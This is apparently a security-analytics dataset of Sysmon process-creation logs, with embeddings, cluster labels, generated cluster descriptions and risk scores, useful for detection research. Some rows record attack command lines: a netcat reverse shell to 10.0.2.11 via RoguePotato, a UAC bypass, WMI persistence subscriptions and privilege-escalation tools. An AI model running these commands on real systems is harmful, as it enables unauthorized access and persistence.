Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2019-03-19T20:42:37.392544Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,gpscript.exe /Logon,"[ 0.0135511  -0.00342353  0.00390347 ... -0.01672808 -0.00066438
  0.02032665]",163,89,"This cluster contains commands related to user session management using the gpscript.exe utility, specifically handling logon and logoff actions. The commands are typically used in a standard administrative context within a Windows environment, indicating user activity controls.",3
2019-03-19T20:42:37.432601Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,C:\Windows\system32\userinit.exe,"[ 0.00296587  0.01345549  0.00536888 ... -0.00403665  0.02206168
 -0.02587185]",-1,93,Unclustered commands,0
2019-03-19T20:42:38.654358Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\cmd.exe"" /c msg *  ""hello from run key""","[-0.02556676 -0.00290134  0.00070673 ...  0.00051295  0.00349197
 -0.00337546]",230,90,"Commands related to message broadcasting using the Windows msg utility, potentially indicating an unauthorized notification or alerting mechanism.",4
2019-03-19T20:42:38.704430Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\PSEXESVC.exe"" ","[-0.00099535  0.01132545 -0.01090599 ... -0.01001114 -0.01133943
 -0.03028509]",111,3,"The commands involve execution of PSEXESVC.exe, a service executable often associated with PsExec, a tool commonly used for executing processes on remote systems. Its use can indicate legitimate administrative tasks or potentially unauthorized remote access, depending on the context.",7
2019-03-19T20:42:38.774531Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"msg  *  ""hello from run key""","[-0.01406142 -0.01105429  0.0040696  ... -0.01039456  0.00077719
  0.00515125]",230,90,"Commands related to message broadcasting using the Windows msg utility, potentially indicating an unauthorized notification or alerting mechanism.",4
2019-03-19T20:43:24.560368Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Program Files\Windows Media Player\wmpnetwk.exe""","[ 0.00282992 -0.00347144 -0.01305109 ...  0.00500108 -0.00563915
 -0.02910973]",-1,132,Unclustered commands,0
2019-03-19T20:46:20.518451Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Program Files\Microsoft Application Compatibility Toolkit\Compatibility Administrator (32-bit)\Compatadmin.exe"" ","[-0.0099073  -0.019876   -0.01585476 ... -0.00313105  0.01220187
 -0.02319123]",-1,73,Unclustered commands,0
2019-03-19T20:48:33.439582Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\sdbinst.exe"" -q ""C:\Windows\AppPatch\Test.SDB  ""  ","[ 0.03928213  0.03087892 -0.00715496 ... -0.00287781  0.01502218
 -0.0169647 ]",115,73,"This cluster contains commands that involve the execution of 'sdbinst.exe', which is a tool used to install and uninstall Software Distribution Base (SDB) files. These files are used for application compatibility management in Windows. The risk is assessed based on the potential for abuse in modifying application behaviors or running unverified SDB files.",6
2019-03-19T20:48:33.870201Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\sdbinst.exe"" -q -u ""C:\Windows\AppPatch\Test.SDB  ""  ","[ 0.03970755  0.03218913 -0.00668582 ... -0.00465971  0.01569434
 -0.01629467]",115,73,"This cluster contains commands that involve the execution of 'sdbinst.exe', which is a tool used to install and uninstall Software Distribution Base (SDB) files. These files are used for application compatibility management in Windows. The risk is assessed based on the potential for abuse in modifying application behaviors or running unverified SDB files.",6
2019-03-19T20:58:20.994444Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\sdbinst.exe"" -q ""C:\Users\user01\Desktop\titi.sdb""  ","[ 0.01555526  0.01800766 -0.01153331 ... -0.01604574  0.01950713
 -0.0166203 ]",-1,73,Unclustered commands,0
2019-03-19T20:58:35.745656Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""c:\osk.exe"" ","[-0.00449926 -0.010038   -0.01073616 ... -0.01525093  0.00358777
 -0.01339693]",104,55,"This cluster contains commands related primarily to the `osk.exe` executable, which is the On-Screen Keyboard in Windows. The commands involve launching this utility directly as well as through command prompt executions.",2
2019-03-19T21:00:01.518992Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,C:\Windows\System32\wsqmcons.exe ,"[ 0.00027251 -0.01807865 -0.00752431 ...  0.0034867   0.01388156
 -0.02425467]",-1,132,Unclustered commands,0
2019-03-19T21:00:01.539020Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\schtasks.exe /delete /f /TN ""Microsoft\Windows\Customer Experience Improvement Program\Uploader""","[ 0.01549427 -0.04597259 -0.00051734 ... -0.00420923 -0.00878098
 -0.00876755]",-1,75,Unclustered commands,0
2019-03-19T21:22:28.886411Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\shell32.dll,OpenAs_RunDLL C:\Windows\AppPatch\Custom\{3ad6ed23-adf8-4bc1-a898-4d695f482c64}.sdb","[ 0.02439835  0.00714967 -0.00595553 ...  0.00986397  0.00048358
 -0.01518642]",231,73,"The commands involve executing rundll32.exe with a specific .sdb file and using WordPad to open the same file, indicating potential interaction with system files related to application compatibility patches.",4
2019-03-19T21:22:33.593179Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Program Files\Windows NT\Accessories\WORDPAD.EXE"" ""C:\Windows\AppPatch\Custom\{3ad6ed23-adf8-4bc1-a898-4d695f482c64}.sdb""","[ 0.04564516 -0.00718124 -0.00990542 ...  0.00499055 -0.01460463
 -0.01870604]",231,73,"The commands involve executing rundll32.exe with a specific .sdb file and using WordPad to open the same file, indicating potential interaction with system files related to application compatibility patches.",4
2019-03-19T21:41:18.410587Z,PC01.example.corp,Microsoft-Windows-Sysmon,1,C:\Windows\servicing\TrustedInstaller.exe,"[-9.76820011e-04 -1.09291608e-02 -3.46290494e-06 ... -2.62180599e-03
 -4.85779438e-03 -2.96307914e-02]",-1,65,Unclustered commands,0
2019-05-21T00:35:07.308923Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\Downloads\com-hijack.exe"" ","[ 0.01229111 -0.02618823 -0.00591044 ... -0.01752152 -0.00808797
 -0.03261231]",-1,54,Unclustered commands,0
2019-05-21T00:35:07.474160Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\system32\cmd.exe /c test.bat,"[-0.02742331  0.00649711  0.00571598 ...  0.01224327  0.00017999
 -0.0117538 ]",224,15,"This cluster includes commands related to the execution, registration, and manipulation of the calculator application along with the execution of batch scripts and a pause command. The presence of 'cmd.exe' and 'rundll32.exe' indicates potential use of scripting for automation or task execution.",3
2019-05-21T00:35:07.474160Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\system32\cmd.exe /c pause,"[-0.05244588 -0.00173715  0.0044728  ...  0.00422317 -0.01149095
 -0.02561729]",224,15,"This cluster includes commands related to the execution, registration, and manipulation of the calculator application along with the execution of batch scripts and a pause command. The presence of 'cmd.exe' and 'rundll32.exe' indicates potential use of scripting for automation or task execution.",3
2019-05-21T00:35:07.518223Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Program Files\Mozilla Firefox\firefox.exe""","[ 0.00909736 -0.02573293 -0.00150408 ...  0.00298783  0.00558247
 -0.01809982]",216,51,"This cluster contains commands related to launching web browsers, specifically Mozilla Firefox and Internet Explorer. These applications are commonly used for internet browsing.",3
2019-05-21T00:35:07.870729Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=""3168.0.153744822\2027949517"" -parentBuildID 20190507012018 -greomni ""C:\Program Files\Mozilla Firefox\omni.ja"" -appomni ""C:\Program Files\Mozilla Firefox\browser\omni.ja"" -appdir ""C:\Program Files\Mozilla Firefox\browser"" - 3168 ""\\.\pipe\gecko-crash-server-pipe.3168"" 956 gpu","[-0.00677987 -0.04545741 -0.00871697 ...  0.00745427 -0.00828651
 -0.01129978]",116,51,"This cluster consists of multiple commands executed by Mozilla Firefox, specifically related to the browser's content process. Each command appears to be launching a separate instance to handle rendering and processing web content, using specific channels and child IDs. The common parameters suggest these processes are initiated for browser tabs, indicating normal operational behavior of Firefox.",2
2019-05-21T00:35:08.728057Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=""3168.6.1176946839\1268428683"" -childID 1 -isForBrowser -prefsHandle 1844 -prefMapHandle 1836 -prefsLen 1 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni ""C:\Program Files\Mozilla Firefox\omni.ja"" -appomni ""C:\Program Files\Mozilla Firefox\browser\omni.ja"" -appdir ""C:\Program Files\Mozilla Firefox\browser"" - 3168 ""\\.\pipe\gecko-crash-server-pipe.3168"" 1680 tab","[ 0.00590476 -0.05296567 -0.01132237 ...  0.00810428  0.00043179
 -0.02175903]",116,51,"This cluster consists of multiple commands executed by Mozilla Firefox, specifically related to the browser's content process. Each command appears to be launching a separate instance to handle rendering and processing web content, using specific channels and child IDs. The common parameters suggest these processes are initiated for browser tabs, indicating normal operational behavior of Firefox.",2
2019-05-21T00:35:10.161517Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=""3168.13.1464597065\1561502721"" -childID 2 -isForBrowser -prefsHandle 2432 -prefMapHandle 2436 -prefsLen 5401 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni ""C:\Program Files\Mozilla Firefox\omni.ja"" -appomni ""C:\Program Files\Mozilla Firefox\browser\omni.ja"" -appdir ""C:\Program Files\Mozilla Firefox\browser"" - 3168 ""\\.\pipe\gecko-crash-server-pipe.3168"" 2448 tab","[-0.0001018  -0.04819338 -0.00982323 ...  0.00637394  0.00021267
 -0.02104554]",116,51,"This cluster consists of multiple commands executed by Mozilla Firefox, specifically related to the browser's content process. Each command appears to be launching a separate instance to handle rendering and processing web content, using specific channels and child IDs. The common parameters suggest these processes are initiated for browser tabs, indicating normal operational behavior of Firefox.",2
2019-05-21T00:35:12.705165Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Program Files\Mozilla Firefox\firefox.exe"" -contentproc --channel=""3168.20.1502540827\1989220046"" -childID 3 -isForBrowser -prefsHandle 3032 -prefMapHandle 3056 -prefsLen 6207 -prefMapSize 183351 -parentBuildID 20190507012018 -greomni ""C:\Program Files\Mozilla Firefox\omni.ja"" -appomni ""C:\Program Files\Mozilla Firefox\browser\omni.ja"" -appdir ""C:\Program Files\Mozilla Firefox\browser"" - 3168 ""\\.\pipe\gecko-crash-server-pipe.3168"" 3024 tab","[ 0.00171074 -0.05375433 -0.00931632 ...  0.006783    0.0014634
 -0.0189924 ]",116,51,"This cluster consists of multiple commands executed by Mozilla Firefox, specifically related to the browser's content process. Each command appears to be launching a separate instance to handle rendering and processing web content, using specific channels and child IDs. The common parameters suggest these processes are initiated for browser tabs, indicating normal operational behavior of Firefox.",2
2019-06-14T22:22:17.988370Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\Downloads\a.exe"" ","[ 0.00483037  0.00081181  0.00655777 ... -0.01678845 -0.0103714
 -0.02171381]",117,54,This cluster includes multiple executions of a potentially malicious executable file located in the Downloads folder. The repetition of the command suggests a possible attempt to ensure execution or to bypass security mechanisms.,8
2019-06-14T22:22:21.535245Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\Downloads\a.exe""","[ 0.00344056  0.00227403  0.00961854 ... -0.01418448 -0.00810133
 -0.02138407]",117,54,This cluster includes multiple executions of a potentially malicious executable file located in the Downloads folder. The repetition of the command suggests a possible attempt to ensure execution or to bypass security mechanisms.,8
2019-06-14T22:22:32.222745Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmpA185.tmp""","[-0.01065852  0.01001184 -0.00625643 ... -0.00416056 -0.00179979
 -0.00573831]",118,13,"This cluster involves the execution of the Visual Basic Compiler (vbc.exe) to generate text output files in the temporary directory. Such usage can indicate scripting or automation, but it might also signify potential misuse or malicious activity, particularly if the files are later executed or contain harmful scripts.",5
2019-06-14T22:22:55.441495Z,IEWIN7,Microsoft-Windows-Sysmon,1,\SystemRoot\System32\smss.exe 00000000 00000040 ,"[ 0.0542376  -0.00143769  0.00105886 ...  0.01233965  0.00909946
 -0.00228796]",74,20,"Commands executed involve multiple instances of the Session Manager Subsystem (smss.exe) with various parameters, indicating potential manipulation or monitoring of system sessions.",6
2019-06-14T22:23:06.691495Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\system32\DllHost.exe /Processid:{E10F6C3A-F1AE-4ADC-AA9D-2FE65525666E},"[ 0.003705   -0.01345428 -0.00434298 ...  0.00642668  0.0045615
 -0.0357428 ]",88,9,"Commands related to executing DllHost.exe with various process IDs, indicating possible uses of COM objects or DCOM infrastructure that may be benign or malicious based on context.",4
2019-06-14T22:23:07.019620Z,IEWIN7,Microsoft-Windows-Sysmon,1,efsui.exe /efs /keybackup,"[-0.00148998  0.0344506   0.00419789 ... -0.00837255  0.015289
  0.00362088]",-1,100,Unclustered commands,0
2019-06-14T22:23:13.957120Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Users\IEUser\AppData\Roaming\9QxTsAU9w8gyPj4w\BRE6BgE2JubB.exe""","[ 0.01187072 -0.00940962 -0.00085207 ... -0.0143784   0.00480962
 -0.03735899]",-1,54,Unclustered commands,0
2019-06-14T22:23:15.054777Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\VBoxTray.exe"" ","[-0.00018549  0.00173351 -0.0021928  ...  0.00111155  0.02586065
 -0.00931979]",199,65,"This cluster consists of commands related to VirtualBox, specifically the VBoxService and VBoxTray executables, which are used to enhance the operation of virtual machines. They facilitate features such as shared clipboard and host-guest file sharing. While they are legitimate components, their presence may indicate the system is running in a virtualized environment which could be exploited.",4
2019-06-14T22:23:23.405362Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\eventvwr.exe"" ","[ 0.00138905  0.02553491 -0.0133471  ... -0.00602145  0.015925
 -0.02108079]",-1,70,Unclustered commands,0
2019-06-14T22:23:26.999112Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\Microsoft.NET\Framework\v2.0.50727\vbc.exe"" /stext ""C:\Users\IEUser\AppData\Local\Temp\tmp7792.tmp""","[-0.00732642  0.01019732 -0.0076015  ... -0.00376782  0.00061748
 -0.00311499]",118,13,"This cluster involves the execution of the Visual Basic Compiler (vbc.exe) to generate text output files in the temporary directory. Such usage can indicate scripting or automation, but it might also signify potential misuse or malicious activity, particularly if the files are later executed or contain harmful scripts.",5
2019-05-13T18:02:49.160591Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\System32\mobsync.exe -Embedding,"[ 0.02062708 -0.00458338 -0.01244113 ...  0.00371386 -0.00090017
 -0.01978208]",-1,101,Unclustered commands,0
2019-05-13T18:03:19.681478Z,IEWIN7,Microsoft-Windows-Sysmon,1,/c notepad.exe,"[-0.01049178 -0.01652163  0.00048095 ... -0.01300357 -0.0081516
 -0.02388537]",232,29,"The commands executed involve launching Notepad, a benign text editor commonly used in Windows environments. However, the second command specifies the path directly to the executable, which could imply an attempt to bypass normal execution methods and could indicate potential scrutiny for malicious behavior, depending on the context.",2
2019-05-11T17:57:49.903159Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u elevate -5 -p c:\Windows\System32\cmd.exe,"[-0.03847949  0.01594893  0.00059944 ...  0.00486767 -0.00494345
 -0.02856373]",92,84,"This cluster contains commands related to privilege escalation and user access control bypassing using a Python script, indicating an attempt to gain higher-level access to the system through executable manipulation.",9
2019-05-11T17:58:22.809409Z,IEWIN7,Microsoft-Windows-Sysmon,1,python  winpwnage.py -u elevate -i 5 -p c:\Windows\System32\cmd.exe,"[-0.04643995  0.01420583 -0.00140579 ...  0.00494922 -0.00172759
 -0.0238618 ]",92,84,"This cluster contains commands related to privilege escalation and user access control bypassing using a Python script, indicating an attempt to gain higher-level access to the system through executable manipulation.",9
2019-05-11T17:58:23.215659Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer CREATE Name=""BotConsumer23"", ExecutablePath=""c:\Windows\System32\cmd.exe"", CommandLineTemplate=""c:\Windows\System32\cmd.exe""","[ 0.00593731 -0.01959499 -0.01217986 ...  0.00967838  0.00217019
 -0.03192375]",164,45,"This cluster contains commands that create and delete a Windows Management Instrumentation (WMI) event consumer, specifically designed to automate command execution. The use of WMI for command execution can indicate potential malicious behavior, particularly if automated execution is being used by unauthorized actors.",7
2019-05-11T17:58:23.450034Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name=""BotFilter82""', Consumer='CommandLineEventConsumer.Name=""BotConsumer23""'","[ 0.01265773 -0.02618478 -0.00727688 ...  0.00090493 -0.00674104
 -0.03783078]",146,45,"This cluster consists of commands that manipulate Windows Management Instrumentation (WMI) to create event filters and consumers related to system performance metrics. The presence of 'BotFilter' and 'BotConsumer' indicates the possibility of automated scripts or monitoring tools that could be used for benign monitoring or malicious purposes, particularly if associated with unauthorized activity.",7
2019-05-11T17:58:23.590659Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter CREATE Name=""BotFilter82"", EventNameSpace=""root\cimv2"", QueryLanguage=""WQL"", Query=""SELECT * FROM __InstanceModificationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'""","[ 0.00681628 -0.01138397 -0.00968454 ... -0.0011243  -0.00322818
 -0.01663812]",146,45,"This cluster consists of commands that manipulate Windows Management Instrumentation (WMI) to create event filters and consumers related to system performance metrics. The presence of 'BotFilter' and 'BotConsumer' indicates the possibility of automated scripts or monitoring tools that could be used for benign monitoring or malicious purposes, particularly if associated with unauthorized activity.",7
2019-05-11T17:58:50.090659Z,IEWIN7,Microsoft-Windows-Sysmon,1,c:\Windows\System32\cmd.exe,"[-0.03486032 -0.01393373  0.00232353 ...  0.01260495 -0.00022955
 -0.01431233]",1,57,"This cluster consists of multiple executions of the Windows Command Prompt (cmd.exe) with various cases of file path formatting. The commands do not execute any additional parameters, which might suggest they are either just opening a command line interface or not executing any potentially harmful commands.",2
2019-05-11T17:58:54.887534Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH CommandLineEventConsumer WHERE Name=""BotConsumer23"" DELETE","[-0.02269195 -0.03596635 -0.00566524 ... -0.0023389  -0.01243023
 -0.03320924]",164,45,"This cluster contains commands that create and delete a Windows Management Instrumentation (WMI) event consumer, specifically designed to automate command execution. The use of WMI for command execution can indicate potential malicious behavior, particularly if automated execution is being used by unauthorized actors.",7
2019-05-11T17:58:55.028159Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __EventFilter WHERE Name=""BotFilter82"" DELETE","[-0.01623307 -0.0353616  -0.00236219 ... -0.00434319 -0.01310658
 -0.01795802]",119,45,"Commands related to the deletion of event filters and bindings, suggesting manipulation of system event subscriptions.",6
2019-05-11T17:58:55.153159Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\wbem\WMIC.exe"" /namespace:""\\root\subscription"" PATH __FilterToConsumerBinding WHERE Filter='__EventFilter.Name=""BotFilter82""' DELETE","[-0.00918832 -0.04003749 -0.00319091 ... -0.00484421 -0.01701817
 -0.02515406]",119,45,"Commands related to the deletion of event filters and bindings, suggesting manipulation of system event subscriptions.",6
2019-04-03T18:11:54.098352Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,"""C:\Users\user01\Desktop\WMIGhost.exe"" ","[ 0.00815618 -0.01348015 -0.00427004 ... -0.0227301   0.00108109
 -0.00673283]",-1,80,Unclustered commands,0
2019-04-03T18:12:00.016862Z,PC04.example.corp,Microsoft-Windows-Sysmon,1,C:\Windows\system32\wbem\scrcons.exe -Embedding,"[ 0.01703253 -0.00085456 -0.01572775 ... -0.0081803  -0.00395147
 -0.02617384]",-1,43,Unclustered commands,0
2021-08-22T19:33:38.725718Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,c:\temp\EfsPotato.exe  whoami,"[-0.00711496 -0.01845444 -0.00277928 ...  0.02586586 -0.01827656
 -0.02481344]",-1,31,Unclustered commands,0
2021-08-22T19:33:52.250240Z,LAPTOP-JU4M3I0E,Microsoft-Windows-Sysmon,1,"""C:\Users\bouss\AppData\Local\Microsoft\OneDrive\21.139.0711.0001\FileCoAuth.exe"" -Embedding","[ 0.02446983 -0.03814736 -0.00529478 ...  0.00610576 -0.00640988
 -0.02348729]",147,101,"Commands related to the execution of FileCoAuth.exe, a Microsoft OneDrive component that allows for collaborative editing and real-time co-authoring. They are executed with the -Embedding parameter, suggesting they might be linked to integration with other applications.",3
2020-10-01T18:35:02.415351Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,POC.exe,"[-0.0145702  -0.00680026 -0.01899596 ...  0.00454179 -0.00154467
 -0.00479457]",-1,72,Unclustered commands,0
2020-10-01T18:35:02.606952Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,Program,"[ 0.01364513 -0.00082885 -0.02518552 ... -0.02142196 -0.00377248
  0.00844571]",-1,72,Unclustered commands,0
2020-05-10T00:09:36.635333Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"NetworkServiceExploit.exe  -i -c ""c:\Windows\System32\cmd.exe""","[-0.01090538 -0.01962686 -0.00253085 ...  0.01156759 -0.00810154
 -0.03218072]",-1,67,Unclustered commands,0
2020-05-11T23:21:56.493742Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"RoguePotato.exe  -r 10.0.2.11 -e ""c:\Users\IEUser\tools\misc\nc64.exe 10.0.2.11 3001 -e cmd.exe"" -l 9999","[-0.03001905 -0.02919452 -0.01296347 ... -0.00047263 -0.00866521
 -0.03762306]",233,67,"This cluster contains commands that utilize RoguePotato and nc64.exe to establish a reverse shell and execute arbitrary commands remotely, indicating potential unauthorized access or exploitation activity.",9
2020-05-11T23:21:56.587063Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,c:\Users\IEUser\tools\misc\nc64.exe 10.0.2.11 3001 -e cmd.exe,"[-0.02643537 -0.02038826 -0.0053949  ... -0.00597925 -0.00554947
 -0.0395098 ]",233,67,"This cluster contains commands that utilize RoguePotato and nc64.exe to establish a reverse shell and execute arbitrary commands remotely, indicating potential unauthorized access or exploitation activity.",9
2019-05-26T15:47:56.667118Z,IEWIN7,Microsoft-Windows-Sysmon,1,C:\Windows\System32\notepad.exe,"[ 0.00884099 -0.03788801 -0.00421816 ... -0.00435191 -0.0073252
 -0.03467809]",90,29,"This cluster consists of multiple executions of the Notepad application, demonstrating various case sensitivity and formatting of paths. The commands appear benign, suggesting a typical usage pattern of opening a text editor.",1
2019-05-26T15:48:00.752994Z,IEWIN7,Microsoft-Windows-Sysmon,1,"""C:\Windows\System32\notepad.exe""","[ 0.01406159 -0.03805375 -0.00518058 ... -0.01175387 -0.0012102
 -0.03277897]",90,29,"This cluster consists of multiple executions of the Notepad application, demonstrating various case sensitivity and formatting of paths. The commands appear benign, suggesting a typical usage pattern of opening a text editor.",1
2020-05-02T18:01:54.855306Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,PrintSpoofer.exe  -i -c powershell.exe,"[ 0.0048485  -0.01050682 -0.00690099 ... -0.01947776 -0.01791395
 -0.03585583]",-1,22,Unclustered commands,0
2020-05-02T18:01:54.867394Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,powershell.exe,"[-0.01729757  0.01106068  0.00399516 ... -0.00689905  0.00748723
 -0.01817059]",-1,110,Unclustered commands,0
2020-05-02T18:01:57.418442Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\whoami.exe""","[-0.00714024 -0.00555079 -0.00408415 ...  0.0103016  -0.00529115
 -0.02558558]",47,31,"This cluster contains commands that execute the `whoami.exe` utility, primarily used for identifying the currently logged-in user and obtaining user information. The commands show little variation, mostly pertaining to user identification, with a repeated structure.",2
2022-02-19T17:35:16.207004Z,DESKTOP-TTEQ6PR,Microsoft-Windows-Sysmon,1,"""C:\Users\win10\Desktop\SpoolFool-main\SpoolFool.exe"" -dll C:\ProgramData\Test.dll","[ 0.03471991  0.01959616 -0.00638493 ...  0.00137923  0.00091489
 -0.04416491]",-1,10,Unclustered commands,0
2020-08-12T13:05:20.029483Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\SYSTEM32\cmd.exe /c """"C:\Program Files\Npcap\CheckStatus.bat""""","[-0.04601752  0.00650949  0.00063053 ...  0.0202298  -0.01062854
 -0.01180071]",-1,15,Unclustered commands,0
2020-08-12T13:05:38.260138Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\cmd.exe /c reg query ""HKLM\Software\WOW6432Node\Npcap"" /ve 2>nul | find ""REG_SZ""","[-0.02110823  0.00669259 -0.00194324 ...  0.00751624 -0.00855739
 -0.02677037]",-1,21,Unclustered commands,0
2020-08-12T13:06:00.737148Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\cmd.exe /c rmdir /s/q C:\ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e > nul 2>&1,"[-0.02580724 -0.0350432  -0.00475904 ... -0.00586899 -0.00047795
 -0.01836798]",188,15,"This cluster consists of commands related to managing the Windows Event Reporting system, specifically removing and creating directories associated with Event Reporting. The commands show manipulation of system files that may indicate an attempt to hide or manage errors in software operations.",6
2020-08-12T13:06:01.637860Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\cmd.exe /c mkdir,C:\ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e","[-0.01412163 -0.00602125 -0.00108334 ... -0.00405764 -0.00786936
 -0.01155812]",188,15,"This cluster consists of commands related to managing the Windows Event Reporting system, specifically removing and creating directories associated with Event Reporting. The commands show manipulation of system files that may indicate an attempt to hide or manage errors in software operations.",6
2020-08-12T13:06:02.552084Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\system32\cmd.exe /c copy Report.wer C:\ProgramData\Microsoft\Windows\WER\ReportQueue\a_b_c_d_e > nul 2>&1,"[-0.00960526 -0.01000272 -0.00383106 ... -0.01183545 -0.00872938
 -0.01653136]",234,15,This cluster features commands related to copying Windows Error Reporting files and executing a scheduled task for error reporting. The commands primarily manipulate system files associated with error handling in Windows.,3
2020-08-12T13:06:03.487498Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\system32\cmd.exe /c schtasks /run /TN ""Microsoft\Windows\Windows Error Reporting\QueueReporting"" > nul 2>&1","[-0.01953295 -0.01789105  0.00262916 ...  0.00066614 -0.0017401
 -0.01889601]",234,15,This cluster features commands related to copying Windows Error Reporting files and executing a scheduled task for error reporting. The commands primarily manipulate system files associated with error handling in Windows.,3
